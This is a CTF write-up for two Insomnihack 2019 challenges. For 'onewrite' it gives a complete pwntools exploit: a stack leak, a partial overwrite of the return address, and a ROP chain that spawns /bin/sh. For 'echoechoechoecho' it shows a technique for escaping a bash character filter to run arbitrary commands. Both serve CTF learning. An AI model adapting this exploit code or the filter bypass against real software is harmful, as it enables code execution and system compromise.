# pwn

## onewrite

A simple program, I will paste its decompile code here:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2LL, 0LL);
  setvbuf(stdout, 0LL, 2LL, 0LL);
  puts("All you need to pwn nowadays is a leak and a qword write they say...");
  return do_leak((__int64)"All you need to pwn nowadays is a leak and a qword write they say...", 0LL);
}

{
  __int64 v2; // rax
  const char *v3; // rdi
  __int64 v5; // [rsp+0h] [rbp-18h]
  __int64 (__fastcall *v6)(); // [rsp+8h] [rbp-10h]

  v6 = (__int64 (__fastcall *)())do_leak;
  puts("What do you want to leak ?");
  puts("1. stack");
  puts("2. pie");
  printf((unsigned __int64)" > ");
  v2 = read_int_3(" > ");
  if ( v2 == 1 )
  {
    a2 = (__int64 (__fastcall *)())&v5;
    v3 = (const char *)&off_880EA;
    printf((unsigned __int64)&off_880EA);
  }
  else if ( v2 == 2 )
  {
    a2 = v6;
    v3 = (const char *)&off_880EA;
    printf((unsigned __int64)&off_880EA);
  }
  else
  {
    v3 = "Nope";
    puts("Nope");
  }
  return do_overwrite(v3, a2);
}

__int64 do_overwrite()
{
  __int64 v0; // ST08_8

  printf((unsigned __int64)"address : ");
  v0 = read_int_3("address : ");
  printf((unsigned __int64)"data : ");
  return read(0LL, v0, 8LL);
}
```

The program can leak a **stack** or **function** pointer for us once. Then, it will call `do_overwrite` which allows us to overwrite 8 bits to arbitrary address. Since the function is statically linked, we can not overwrite *.got* table or use *one_gadget*.

Our choice is obvious: leak *stack* and overwrite *ret*. To prevent it exiting, we need to write the **ret** to **main** pointer. Because base address haven't leaked yet, we need to brute-force **main** address via changing the lower two bytes of *ret* address.

In this round, we can leak `do_leak` pointer address. This allows us to get *BSS* base address. When our leak finished, we can write **ROP** gadget to *BSS* area that will be used later. **main** function is invoked by **ret** rather than **__libc_init_main** this time. So, the program will return to **main** one more time when *ret* is executed. In next round, the *rsp* is reseted. And we need to change *ret* to **main** once again.

Repeat above until the ROP chain is fully loaded. In the last two rounds, we change *ret* to `pop rsp, ret` and 8 bits before *ret* address to *BSS* address:
```python
from pwn import *
from struct import pack
import time

i = 0
context.log_level = "ERROR"
context.timeout = 600

def exp():
    global i
    rop = ''
    i = i + 1
    p = process("onewrite")
    #p = remote("onewrite.teaser.insomnihack.ch", 1337)
    #gdb.attach(p)

    def _leak(opt):
        p.sendlineafter(">", str(opt))
        return int(p.recvline()[:-1], 16)

    def _write(addr, content):
        p.sendafter(":", str(addr) + content)

    try:
        stack_ptr = _leak(1)
        print "Stack Pointer: " + hex(stack_ptr)
        # partially overwrite the last 2 bytes
        ret_addr = stack_ptr - 0x8
        # return to main function
        p.sendafter(":", str(ret_addr) + "\xb8\x2a")
        # new stack_ptr address
        stack_ptr = stack_ptr - 0x28
        # leak function address
        base_addr = _leak(2) - 0x8a15
        bss_addr = base_addr + 0x2b3328
        main_addr = base_addr + 0x8ab8
        print "Base Address: " + hex(base_addr)
        print "BSS Address: " + hex(bss_addr)
        print "main() Address: " + hex(main_addr)

        # ROP Generated By ropper
        IMAGE_BASE_0 = base_addr
        rebase_0 = lambda x : p64(x + IMAGE_BASE_0)
        rop += rebase_0(0x00000000000460ac) # 0x00000000000460ac: pop rax; ret;
        rop += '//bin/sh'
        rop += rebase_0(0x000000000000d9f2) # 0x000000000000d9f2: pop rsi; ret;
        rop += rebase_0(0x00000000002b1120)
        rop += rebase_0(0x0000000000077901) # 0x0000000000077901: mov qword ptr [rsi], rax; ret;
        rop += rebase_0(0x00000000000460ac) # 0x00000000000460ac: pop rax; ret;
        rop += p64(0x0000000000000000)
        rop += rebase_0(0x000000000000d9f2) # 0x000000000000d9f2: pop rsi; ret;
        rop += rebase_0(0x00000000002b1128)
        rop += rebase_0(0x0000000000077901) # 0x0000000000077901: mov qword ptr [rsi], rax; ret;
        rop += rebase_0(0x00000000000084fa) # 0x00000000000084fa: pop rdi; ret;
        rop += rebase_0(0x00000000002b1120)
        rop += rebase_0(0x000000000000d9f2) # 0x000000000000d9f2: pop rsi; ret;
        rop += rebase_0(0x00000000002b1128)
        rop += rebase_0(0x00000000000484c5) # 0x00000000000484c5: pop rdx; ret;
        rop += rebase_0(0x00000000002b1128)
        rop += rebase_0(0x00000000000460ac) # 0x00000000000460ac: pop rax; ret;
        rop += p64(0x000000000000003b)
        rop += rebase_0(0x000000000006e605) # 0x000000000006e605: syscall; ret;

        # Write ROP to BSS
        # The first write couldn't use following function
        # because the stack layout is affected by previous leak/write
        offset = 0 * 8
        _write(bss_addr + offset, rop[offset: offset + 8])
        stack_ptr = _leak(1)
        _write(stack_ptr - 8, p64(main_addr))
        stack_ptr = _leak(1)
        _write(stack_ptr - 8, p64(main_addr))

        print "Write Stage 1"

        def write_rop(i):
            offset = i * 8
            stack_ptr = _leak(1)
            _write(bss_addr + offset, rop[offset: offset + 8])
            stack_ptr = _leak(1)
            _write(stack_ptr - 8, p64(main_addr))
            stack_ptr = _leak(1)
            _write(stack_ptr - 8, p64(main_addr))

        for i in range(1, len(rop) / 8):
            write_rop(i)
            print "Now is: " + str(i)

        print "Write All"

        # trigger our ROP
        stack_ptr = _leak(1)
        print "RET Value: " + hex(stack_ptr + 0x38)
        _write(stack_ptr + 0x38, p64(base_addr + 0x946a))
        stack_ptr = _leak(1)
        print "RSP Addr: " + hex(stack_ptr + 0x20)
        _write(stack_ptr + 0x20, p64(bss_addr))
        print "Triggering ROP"

        p.sendline("cat flag")
        print p.recvline()
        sleep(0.5)
        p.sendline("cat /flag")
        print p.recvline()
        p.interactive()

    except:
        p.close()
        print "Trying: " + str(i)




while True:
    exp()
```

> btw, the server really sucked. My connections failed for hours

## echoechoechoecho

Server script:
```python
#!/usr/bin/env python3

from os import close
from random import choice
import re
from signal import alarm
from subprocess import check_output
from termcolor import colored

alarm(10)

colors = ["red","blue","green","yellow","magenta","cyan","white"]
# thanks http://patorjk.com/software/taag/#p=display&h=0&f=Crazy&t=echo
banner = """
                            _..._                 .-'''-.
                         .-'_..._''.             '   _    \\
       __.....__       .' .'      '.\  .       /   /` '.   \\
   .-''         '.    / .'           .'|      .   |     \  '
  /     .-''"'-.  `. . '            <  |      |   '      |  '
 /     /________\   \| |             | |      \    \     / /
 |                  || |             | | .'''-.`.   ` ..' /
 \    .-------------'. '             | |/.'''. \  '-...-'`
  \    '-.____...---. \ '.          .|  /    | |
   `.             .'   '. `._____.-'/| |     | |
     `''-...... -'       `-.______ / | |     | |
                                  `  | '.    | '.
                                     '---'   '---'
"""

def bye(s=""):
    print(s)
    print("bye")
    exit()

def check_input(payload):
    if payload == 'thisfile':
        bye(open("/bin/shell").read())

    if not all(ord(c) < 128 for c in payload):
        bye("ERROR ascii only pls")

    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        bye("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        bye("ERROR Too many special chars.")

    return payload


print(colored(banner, choice(colors)))
print("Hi, what would you like to echo today? (make sure to try 'thisfile')")
payload = check_input(input())


print("And how often would you like me to echo that?")
count = max(min(int(input()), 10), 0)

payload += "|bash"*count

close(0)
result = check_output(payload, shell=True, executable="/bin/bash")
bye(result.decode())
```

It's quite easy to understand: we can only input `echo`, `$`, `\\`, `(`, `)`, `;`, `+`, `=`, `'`, and ` ` as our input. The executing number of bash should be less than 10. What's more, they have maxinum input times. Our goal is to bypass the limitation to execute arbitrary commands.

Before explaining my method, let's introduce several concepts:
- `var=22`: give `var` value `22`. The server will not block `echo` or `echoecho` or `echo * n` here. We can use them as varaible name
- `$((echo==echo))`: compare operation in bash, and this will return 1
- `$((1+1))`: add operation which returns 2, `1` can be replaced to bash variable
- `echo $var`: show the value of varaible `var`, it can be number or string
- `echo $'\044'`: out put `$`, its ascii in **oct** is `44`. We can use `$\XXX` to convert **oct** value to its ascii
- `echo 'echo 123' | bash`: output `123`, too easy to explain

Now you may guess out my method: using `echo` and varaible to bypass symbol limitation. Then get number `1` and plus it to access arbitrary number. And finally format them to characters, somehow looks like this:
```bash
#!/bin/bash

# following code is not escaped to understand easily
# first bash execution
# use echo*n to replace varaible name
# get = symbols first
eqaul=\=;

# second bash execution
# use the varaible name to replace those symbols
# e.g. = \s\e\m\i\c\o\l\o\n$equal\;;
# the follwing code should be echo out to bash to execute
# second bash
semicolon=\;;

# third bash execution
lbracket=\(;
rbracket=\);
quote=\';
plus=+;

# now, we control all they symbols
# remember to replace them to craft payload
# it's easiser to replace them from the bottom to the up
# get char
n1=$((echo==echo));
n2=$((n1+n1));
n4=$((n2+n2));
n8=$((n8+n8));
n16=$((n8+b8));
n32=$((n16+n16));
n64=$((n32+n32));
n128=$((n64+n64))
# l and s should be expressed in oct
l=$((n128+n16+n8+n2));
s=$((l+n8+n1));

# last bash exectuion, trigger ls
echo \$\'\\$l\\$s\' | bash
```

As you may guess, crafting the payload is really time consuming (you need to bottom-up replace string to cusomized varaible). [This](https://github.com/ssspeedgit00/CTF/blob/master/2019/insomnihack/echoechoechoecho/solve.py) may be a good reference to final exploit script



